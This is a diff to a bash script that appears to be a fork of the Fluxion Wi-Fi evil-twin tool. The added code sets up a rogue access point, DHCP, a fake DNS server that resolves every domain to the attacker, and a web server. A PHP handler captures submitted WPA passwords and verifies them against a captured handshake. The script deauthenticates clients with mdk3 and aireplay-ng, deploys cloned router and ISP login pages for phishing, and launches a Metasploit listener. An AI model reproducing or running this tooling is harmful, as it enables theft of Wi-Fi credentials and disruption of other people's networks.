@@ -34,8 +34,11 @@ clear
 DUMP_PATH="/tmp/TMPflux"
 WORK_DIR=`pwd`
 HANDSHAKE_PATH="$WORK_DIR/handshakes"
-PASSLOG_PATH="~/Desktop/pwlog"
+PASSLOG_PATH="$WORK_DIR/../../../Victim/pwlog"
+script_listerning="$WORK_DIR/lib/metasploit/script-listerning.rc"
+script_auto_command="$WORK_DIR/lib/metasploit/auto-script.rc"
 DEAUTHTIME="9999999999999"
+Metasp_configure=""
 revision=9
 version=2
 IP=192.168.1.1
@@ -930,8 +933,8 @@ function handshakelocation {
 
         top
         infoap
-        if [ -f "/root/Desktop/pentest/Wireless-Attacks/fluxion/handshakes/$Host_SSID2-$Host_MAC.cap" ]; then
-                echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in /root/Desktop/pentest/Wireless-Attacks/fluxion/handshakes."
+        if [ -f "$WORK_DIR/handshakes/$Host_SSID2-$Host_MAC.cap" ]; then
+                echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in $WORK_DIR/handshakes."
                 echo -e "${red}Do you want to use this file? (y/N)"
                 echo -ne "$transparent"
 
@@ -940,7 +943,7 @@ function handshakelocation {
                 fi
 
                 if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "Y" ]; then
-                        handshakeloc="/root/Desktop/pentest/Wireless-Attacks/fluxion/handshakes/$Host_SSID2-$Host_MAC.cap"
+                        handshakeloc="$WORK_DIR/handshakes/$Host_SSID2-$Host_MAC.cap"
                 fi
         fi
         if [ "$handshakeloc" = "" ]; then
@@ -1351,6 +1354,794 @@ function ConnectionRESET {
                         echo
                         echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_ConnectionRESET"
                         echo
+
+			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Take WPA password using phising pages";n=`expr $n + 1`
+			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TROLL ";n=`expr $n + 1`
+			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Say something ";n=`expr $n + 1`
+			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Metasploit";n=`expr $n + 1`
+                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
+                        echo
+                        echo -n "#? "
+                        read webconf
+
+                        if [ "$webconf" = "1" ]; then
+        			phisingWIFIpages
+        			break
+
+			elif [ "$webconf" = "2" ]; then
+        			trolling
+        			break
+
+			elif [ "$webconf" = "3" ]; then
+        			love
+        			break
+
+			elif [ "$webconf" = "4" ]; then
+        			metasploit
+        			break
+
+                        elif [ "$webconf" = "5" ]; then
+                                conditional_clear
+                                webinterface
+                                break
+      fi
+
+        done
+fi
+        preattack
+        attack
+}
+
+# Create different settings required for the script
+function preattack {
+
+        # Config HostAPD
+        echo "interface=$WIFI
+driver=nl80211
+ssid=$Host_SSID
+
+channel=$Host_CHAN" > $DUMP_PATH/hostapd.conf
+
+
+        # Creates PHP
+        echo "<?php
+error_reporting(0);
+
+\$count_my_page = (\"$DUMP_PATH/hit.txt\");
+\$hits = file(\$count_my_page);
+\$hits[0] ++;
+\$fp = fopen(\$count_my_page , \"w\");
+fputs(\$fp , \$hits[0]);
+fclose(\$fp);
+
+// Receive form Post data and Saving it in variables
+\$key1 = @\$_POST['key1'];
+
+// Write the name of text file where data will be store
+\$filename = \"$DUMP_PATH/data.txt\";
+\$filename2 = \"$DUMP_PATH/status.txt\";
+\$intento = \"$DUMP_PATH/intento\";
+\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
+
+// Marge all the variables with text in a single variable.
+\$f_data= ''.\$key1.'';
+
+\$pwlog = fopen(\$attemptlog, \"w\");
+fwrite(\$pwlog, \$f_data);
+fwrite(\$pwlog,\"\n\");
+fclose(\$pwlog);
+
+\$file = fopen(\$filename, \"w\");
+fwrite(\$file, \$f_data);
+fwrite(\$file,\"\n\");
+fclose(\$file);
+
+\$archivo = fopen(\$intento, \"w\");
+fwrite(\$archivo,\"\n\");
+fclose(\$archivo);
+
+while( 1 ) {
+
+        if (file_get_contents( \$intento ) == 1) {
+                header(\"Location:error.html\");
+                unlink(\$intento);
+            break;
+        }
+
+        if (file_get_contents( \$intento ) == 2) {
+                header(\"Location:final.html\");
+                break;
+        }
+
+        sleep(1);
+}
+?>" > $DUMP_PATH/data/check.php
+
+        # Config DHCP
+        echo "authoritative;
+
+default-lease-time 600;
+max-lease-time 7200;
+
+subnet $RANG_IP.0 netmask 255.255.255.0 {
+
+option broadcast-address $RANG_IP.255;
+option routers $IP;
+option subnet-mask 255.255.255.0;
+option domain-name-servers $IP;
+
+range $RANG_IP.100 $RANG_IP.250;
+
+}" > $DUMP_PATH/dhcpd.conf
+
+        #create an empty leases file
+        touch $DUMP_PATH/dhcpd.leases
+
+        # creates Lighttpd web-server
+        echo "server.document-root = \"$DUMP_PATH/data/\"
+
+  server.modules = (
+    \"mod_access\",
+    \"mod_alias\",
+    \"mod_accesslog\",
+    \"mod_fastcgi\",
+    \"mod_redirect\",
+    \"mod_rewrite\"
+  )
+
+  fastcgi.server = ( \".php\" => ((
+                  \"bin-path\" => \"/usr/bin/php-cgi\",
+                  \"socket\" => \"/php.socket\"
+                )))
+
+  server.port = 80
+  server.pid-file = \"/var/run/lighttpd.pid\"
+  # server.username = \"www\"
+  # server.groupname = \"www\"
+
+  mimetype.assign = (
+  \".pdf\"  => \"application/pdf\",
+  \".zip\"  => \"application/zip\",
+  \".html\" => \"text/html\",
+  \".htm\" => \"text/html\",
+  \".txt\" => \"text/plain\",
+  \".jpg\" => \"image/jpeg\",
+  \".gif\" => \"image/gif\",
+  \".png\" => \"image/png\",
+  \".jpeg\" => \"image/jpeg\",
+  \".mp3\" => \"audio/mpeg\",
+  \".swf\" => \"application/x-shockwave-flash\",
+  \".css\" => \"text/css\"
+  )
+
+
+  server.error-handler-404 = \"/\"
+
+  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
+  index-file.names = ( \"index.htm\", \"index.html\" )
+
+  \$SERVER[\"socket\"] == \":443\" {
+        url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
+        ssl.engine                  = \"enable\"
+        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+
+  }
+
+  #Redirect www.domain.com to domain.com
+  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
+        url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+        ssl.engine                  = \"enable\"
+        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+  }
+  " >$DUMP_PATH/lighttpd.conf
+
+
+# that redirects all DNS requests to the gateway
+        echo "import socket
+
+class DNSQuery:
+  def __init__(self, data):
+    self.data=data
+    self.dominio=''
+
+    tipo = (ord(data[2]) >> 3) & 15
+    if tipo == 0:
+      ini=12
+      lon=ord(data[ini])
+      while lon != 0:
+        self.dominio+=data[ini+1:ini+lon+1]+'.'
+        ini+=lon+1
+        lon=ord(data[ini])
+
+  def respuesta(self, ip):
+    packet=''
+    if self.dominio:
+      packet+=self.data[:2] + \"\x81\x80\"
+      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
+      packet+=self.data[12:]
+      packet+='\xc0\x0c'
+      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
+      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
+    return packet
+
+if __name__ == '__main__':
+  ip='$IP'
+  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip
+
+  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  udps.bind(('',53))
+
+  try:
+    while 1:
+      data, addr = udps.recvfrom(1024)
+      p=DNSQuery(data)
+      udps.sendto(p.respuesta(ip), addr)
+      print 'Request: %s -> %s' % (p.dominio, ip)
+  except KeyboardInterrupt:
+    print 'Finalizando'
+    udps.close()" > $DUMP_PATH/fakedns
+        chmod +x $DUMP_PATH/fakedns
+}
+
+# Set up DHCP / WEB server
+# Set up DHCP / WEB server
+function routear {
+
+        ifconfig $interfaceroutear up
+        ifconfig $interfaceroutear $IP netmask 255.255.255.0
+
+        route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
+        sysctl -w net.ipv4.ip_forward=1 &>$flux_output_device
+
+  iptables --flush
+  iptables --table nat --flush
+  iptables --delete-chain
+  iptables --table nat --delete-chain
+  iptables -P FORWARD ACCEPT
+
+  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
+  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
+  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
+  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
+  iptables -t nat -A POSTROUTING -j MASQUERADE
+
+}
+
+# Attack
+function attack {
+
+        interfaceroutear=$WIFI
+
+        handshakecheck
+        nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
+
+        if [ "$fakeapmode" = "hostapd" ]; then
+
+                ifconfig $WIFI down
+                sleep 0.4
+                macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $flux_output_device
+                sleep 0.4
+                ifconfig $WIFI up
+                sleep 0.4
+        fi
+
+
+        if [ $fakeapmode = "hostapd" ]; then
+                killall hostapd &> $flux_output_device
+                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
+                elif [ $fakeapmode = "airbase-ng" ]; then
+                killall airbase-ng &> $flux_output_device
+                xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
+        fi
+        sleep 5
+
+        routear &
+        sleep 3
+
+
+        killall dhcpd &> $flux_output_device
+        fuser -n tcp -k 53 67 80 &> $flux_output_device
+        fuser -n udp -k 53 67 80 &> $flux_output_device
+
+        xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
+        xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
+
+        lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
+
+        killall aireplay-ng &> $flux_output_device
+        killall mdk3 &> $flux_output_device
+        echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
+        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	if [ "$Metasp_configure"="on" ]; then
+        xterm -geometry 100x25+250+150 -fa monaco -fs 12 -bg black -title "Metasploit Listerning" -e msfconsole -r $script_listerning &
+	fi
+        xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
+        conditional_clear
+
+        while true; do
+                top
+
+                echo -e ""$red"["$yellow"2"$red"]"$transparent" Attack in progress .."
+                echo "                                       "
+                echo "      1) Choose another network"
+                echo "      2) Exit"
+                echo " "
+                echo -n '      #> '
+                read yn
+                case $yn in
+                        1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
+                        2 ) matartodo; exitmode; break;;
+                        * ) echo "
+$general_case_error"; conditional_clear ;;
+                esac
+        done
+
+}
+
+# Checks the validity of the password
+function handshakecheck {
+
+        echo "#!/bin/bash
+
+        echo > $DUMP_PATH/data.txt
+        echo -n \"0\"> $DUMP_PATH/hit.txt
+        echo "" >$DUMP_PATH/loggg
+
+        tput civis
+        clear
+
+        minutos=0
+        horas=0
+        i=0
+        timestamp=\$(date +%s)
+
+        while true; do
+
+        segundos=\$i
+        dias=\`expr \$segundos / 86400\`
+        segundos=\`expr \$segundos % 86400\`
+        horas=\`expr \$segundos / 3600\`
+        segundos=\`expr \$segundos % 3600\`
+        minutos=\`expr \$segundos / 60\`
+        segundos=\`expr \$segundos % 60\`
+
+        if [ \"\$segundos\" -le 9 ]; then
+        is=\"0\"
+        else
+        is=
+        fi
+
+        if [ \"\$minutos\" -le 9 ]; then
+        im=\"0\"
+        else
+        im=
+        fi
+
+        if [ \"\$horas\" -le 9 ]; then
+        ih=\"0\"
+        else
+        ih=
+        fi">>$DUMP_PATH/handcheck
+
+        if [ $authmode = "handshake" ]; then
+                echo "if [ -f $DUMP_PATH/pwattempt.txt ]; then
+                cat $DUMP_PATH/pwattempt.txt >> \"$PASSLOG_PATH/$Host_SSID-$Host_MAC.log\"
+                rm -f $DUMP_PATH/pwattempt.txt
+                fi
+
+                if [ -f $DUMP_PATH/intento ]; then
+
+                if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
+                echo \"2\">$DUMP_PATH/intento
+                break
+                else
+                echo \"1\">$DUMP_PATH/intento
+                fi
+
+                fi">>$DUMP_PATH/handcheck
+
+        elif [ $authmode = "wpa_supplicant" ]; then
+                  echo "
+                if [ -f $DUMP_PATH/pwattempt.txt ]; then
+                cat $DUMP_PATH/pwattempt.txt >> $PASSLOG_PATH/$Host_SSID-$Host_MAC.log
+                rm -f $DUMP_PATH/pwattempt.txt
+                fi
+
+                wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
+                wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
+
+                if [ -f $DUMP_PATH/intento ]; then
+
+                if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
+                echo \"2\">$DUMP_PATH/intento
+                break
+                else
+                echo \"1\">$DUMP_PATH/intento
+                fi
+
+                fi
+                ">>$DUMP_PATH/handcheck
+        fi
+
+        echo "readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - $RANG_IP.100-110 2>&1 | grep Host )
+
+        echo
+        echo -e \"  ACCESS POINT:\"
+        echo -e \"    SSID............: "$white"$Host_SSID"$transparent"\"
+        echo -e \"    MAC.............: "$yellow"$Host_MAC"$transparent"\"
+        echo -e \"    Channel.........: "$white"$Host_CHAN"$transparent"\"
+        echo -e \"    Vendor..........: "$green"$Host_MAC_MODEL"$transparent"\"
+        echo -e \"    Operation time..: "$blue"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
+        echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
+        echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
+        echo
+        echo -e \"  CLIENTS ONLINE:\"
+
+        x=0
+        for cliente in \"\${CLIENTESDHCP[@]}\"; do
+          x=\$((\$x+1))
+          CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
+          CLIENTE_MAC=\$(nmap -PR -sn -n \$CLIENTE_IP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])
+
+          if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
+                CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
+          fi
+
+          CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
+
+          if echo \$CLIENTE_MAC| grep -q x; then
+                    CLIENTE_FABRICANTE=\"unknown\"
+          fi
+
+          CLIENTE_HOSTNAME=\$(grep \$CLIENTE_IP $DUMP_PATH/clientes.txt | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')
+
+          echo -e \"    $green \$x) $red\$CLIENTE_IP $yellow\$CLIENTE_MAC $transparent($blue\$CLIENTE_FABRICANTE$transparent) $green \$CLIENTE_HOSTNAME$transparent\"
+        done
+
+        echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
+
+
+        if [ $authmode = "handshake" ]; then
+                echo "let i=\$(date +%s)-\$timestamp
+                sleep 1">>$DUMP_PATH/handcheck
+
+        elif [ $authmode = "wpa_supplicant" ]; then
+                echo "sleep 5
+
+                killall wpa_supplicant &>$flux_output_device
+                killall wpa_passphrase &>$flux_output_device
+                let i=\$i+5">>$DUMP_PATH/handcheck
+        fi
+
+        echo "done
+        clear
+        echo \"1\" > $DUMP_PATH/status.txt
+
+        sleep 7
+
+        killall mdk3 &>$flux_output_device
+        killall aireplay-ng &>$flux_output_device
+        killall airbase-ng &>$flux_output_device
+        kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$flux_output_device
+        killall hostapd &>$flux_output_device
+        killall lighttpd &>$flux_output_device
+        killall dhcpd &>$flux_output_device
+        killall wpa_supplicant &>$flux_output_device
+        killall wpa_passphrase &>$flux_output_device
+
+        echo \"
+        FLUX $version by ghost
+
+        SSID: $Host_SSID
+        BSSID: $Host_MAC ($Host_MAC_MODEL)
+        Channel: $Host_CHAN
+        Security: $Host_ENC
+        Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
+        Password: \$(cat $DUMP_PATH/data.txt)
+        \" >\"$HOME/Desktop/$Host_SSID-password.txt\"">>$DUMP_PATH/handcheck
+
+
+        if [ $authmode = "handshake" ]; then
+                echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/Desktop/$Host_SSID-password.txt"$transparent"\"
+                ">>$DUMP_PATH/handcheck
+
+        elif [ $authmode = "wpa_supplicant" ]; then
+                echo "echo -e \"The password was saved in "$red"$HOME/Desktop/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
+        fi
+
+        echo "kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &>$flux_output_device">>$DUMP_PATH/handcheck
+        chmod +x $DUMP_PATH/handcheck
+}
+
+
+############################################# < ATTACK > ############################################
+
+
+
+
+
+
+############################################## < STUFF > ############################################
+
+# Deauth all
+function deauthall {
+
+        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
+}
+
+function deauthmdk3 {
+
+        echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
+        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+        mdk3PID=$!
+}
+
+# Deauth to a specific target
+function deauthesp {
+
+        sleep 2
+        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
+}
+
+# Close all processes
+function matartodo {
+
+        killall aireplay-ng &>$flux_output_device
+        kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
+        killall hostapd &>$flux_output_device
+        killall lighttpd &>$flux_output_device
+        killall dhcpd &>$flux_output_device
+        killall xterm &>$flux_output_device
+
+}
+
+######################################### < INTERFACE WEB > ########################################
+
+# Create the contents for the web interface
+function NEUTRA {
+
+        if [ ! -d $DUMP_PATH/data ]; then
+                mkdir $DUMP_PATH/data
+        fi
+
+        source $WORK_DIR/lib/site/index | base64 -d > $DUMP_PATH/file.zip
+
+        unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$flux_output_device
+        rm $DUMP_PATH/file.zip &>$flux_output_device
+
+        echo "<!DOCTYPE html>
+        <html>
+        <head>
+            <title>Login Page</title>
+            <meta charset=\"UTF-8\">
+            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+                <!-- Styles -->
+            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+                <!-- Scripts -->
+                <script src=\"js/jquery-1.11.1.min.js\"></script>
+                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+        </head>
+        <body>
+                <!-- final page -->
+            <div id=\"done\" data-role=\"page\" data-theme=\"a\">
+                        <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
+                                <h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
+                        </div>
+            </div>
+        </body>
+</html>" > $DUMP_PATH/data/final.html
+
+        echo "<!DOCTYPE html>
+        <html>
+        <head>
+            <title>Login Page</title>
+            <meta charset=\"UTF-8\">
+            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+                <!-- Styles -->
+            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+                <!-- Scripts -->
+                <script src=\"js/jquery-1.11.1.min.js\"></script>
+                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+                <script src=\"js/jquery.validate.min.js\"></script>
+                <script src=\"js/additional-methods.min.js\"></script>
+        </head>
+        <body>
+                <!-- Error page -->
+            <div data-role=\"page\" data-theme=\"a\">
+                        <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
+                                <h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
+                                <a href=\"index.htm\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.htm'\">$DIALOG_WEB_BACK</a>
+                        </div>
+            </div>
+        </body>
+</html>" > $DUMP_PATH/data/error.html
+
+        echo "<!DOCTYPE html>
+        <html>
+        <head>
+            <title>Login Page</title>
+            <meta charset=\"UTF-8\">
+            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
+                <!-- Styles -->
+            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
+                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
+                <!-- Scripts -->
+                <script src=\"js/jquery-1.11.1.min.js\"></script>
+                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
+                <script src=\"js/jquery.validate.min.js\"></script>
+                <script src=\"js/additional-methods.min.js\"></script>
+        </head>
+        <body>
+                <!-- Main page -->
+            <div data-role=\"page\" data-theme=\"a\">
+                        <div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
+                                <fieldset>
+                                        <form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
+                                                </br>
+                                                <div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
+                                                        <div>ESSID: <u>$Host_SSID</u></div>
+                                                        <div>BSSID: <u>$Host_MAC</u></div>
+                                                        <div>Channel: <u>$Host_CHAN</u></div>
+                                                </div>
+                                                <div style=\"text-align:center;\">
+                                                        <br><label>$DIALOG_WEB_INFO</label></br>
+                                                </div>
+                                                <div class=\"ui-field-contain\" >
+                                                        <label for=\"key1\">$DIALOG_WEB_INPUT</label>
+                                                        <input id=\"key1\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
+                                                </div>
+
+                                                <input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
+                                        </form>
+                                </fieldset>
+                        </div>
+            </div>
+                <script src=\"js/main.js\"></script>
+                <script>
+    $.extend( $.validator.messages, {
+        required: \"$DIALOG_WEB_ERROR_MSG\",
+        maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
+        minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )});
+  </script>
+        </body>
+</html>" > $DUMP_PATH/data/index.htm
+}
+
+# Functions to populate the content for the custom phishing pages
+function phisingWIFIpages {
+	clear
+	sleep 0.5 
+
+		function ARRIS {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/ARRIS-ENG/* $DUMP_PATH/data
+
+				}
+
+		function BELKIN {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/belkin_eng/* $DUMP_PATH/data
+
+				}
+
+		function NETGEAR {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/netgear_eng/* $DUMP_PATH/data
+
+				}
+
+		function ARRIS2 {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/arris_esp/* $DUMP_PATH/data
+
+				}
+		function NETGEAR2 {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/netgear_esp/* $DUMP_PATH/data
+
+				}
+
+		function TPLINK {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+		    	cp -r  $WORK_DIR/sites/tplink/* $DUMP_PATH/data
+				}
+
+		function TPLINKVN {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+		    	cp -r  $WORK_DIR/sites/tplink_vn/* $DUMP_PATH/data
+				}
+
+
+		function VODAFONE {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/vodafone_esp/* $DUMP_PATH/data
+				}
+
+		function VERIZON {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/verizon/Verizon_files $DUMP_PATH/data
+			cp $WORK_DIR/sites/verizon/Verizon.html $DUMP_PATH/data
+				}
+
+		function HUAWEI {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/huawei_eng/* $DUMP_PATH/data
+
+			}
+
+		function ZIGGO_NL {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/ziggo_nl/* $DUMP_PATH/data
+			}
+
+		function KPN_NL {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/kpn_nl/* $DUMP_PATH/data
+			}
+
+		function ZIGGO2016_NL {
+		    	mkdir $DUMP_PATH/data &>$flux_output_device
+		    	cp -r  $WORK_DIR/sites/ziggo2_nl/* $DUMP_PATH/data
+				}
+
+		function FRITZBOX_DE {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/fritzbox_de/* $DUMP_PATH/data
+			}
+
+		function FRITZBOX_ENG {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/fritzbox_eng/* $DUMP_PATH/data
+			}
+
+		function GENEXIS_DE {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r  $WORK_DIR/sites/genenix_de/* $DUMP_PATH/data
+			}
+
+		function Login-Netgear {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/Login-Netgear/* $DUMP_PATH/data
+			}
+
+		function Login-Xfinity {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/Login-Xfinity/* $DUMP_PATH/data
+			}
+
+		function Telekom {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/telekom/* $DUMP_PATH/data
+			}
+
+		function google {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/google_de/* $DUMP_PATH/data
+			}
+
+		function MOVISTAR_ES {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+			cp -r $WORK_DIR/sites/movistar_esp/* $DUMP_PATH/data
+		  	}
+
+		function VNPT {
+			mkdir $DUMP_PATH/data &>$flux_output_device
+		    	cp -r  $WORK_DIR/sites/vnpt/* $DUMP_PATH/data
+			}
+        if [ "$FLUX_AUTO" = "1" ];then
+                webconf=1
+        else
+                while true; do
+                        conditional_clear
+                        top
+
+                        infoap
+                        n=1
+                        echo
+                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_ConnectionRESET"
+                        echo
                         echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  English     [ENG]  (NEUTRA)";n=`expr $n + 1`
                         echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  German      [GER]  (NEUTRA)";n=`expr $n + 1`
                         echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Russian     [RUS]  (NEUTRA)";n=`expr $n + 1`
@@ -1397,8 +2188,6 @@ function ConnectionRESET {
                         echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Google";n=` expr $n + 1`
       	    		echo -e "      "$red"["$yellow"$n"$red"]"$transparent" MOVISTAR    [ESP]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" VNPT        [VN]";n=`expr $n + 1`
-			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" trolling ";n=`expr $n + 1`
-			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Love ";n=`expr $n + 1`
                         echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
                         echo
                         echo -n "#? "
@@ -1838,759 +2627,15 @@ function ConnectionRESET {
 			elif [ "$webconf" = "46" ]; then
         			VNPT
         			break
-
-			elif [ "$webconf" = "47" ]; then
-        			trolling
-        			break
-
-			elif [ "$webconf" = "48" ]; then
